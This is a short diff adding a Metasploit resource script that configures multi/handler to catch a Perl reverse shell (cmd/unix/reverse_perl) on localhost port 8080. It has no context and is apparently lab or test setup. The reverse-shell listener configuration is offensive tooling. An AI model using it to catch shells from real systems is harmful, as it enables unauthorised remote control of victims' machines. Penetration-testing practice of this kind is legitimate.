@@ -1,0 +1,5 @@
+use multi/handler
+set payload cmd/unix/reverse_perl
+set LHOST 127.0.0.1
+set LPORT 8080
+show options
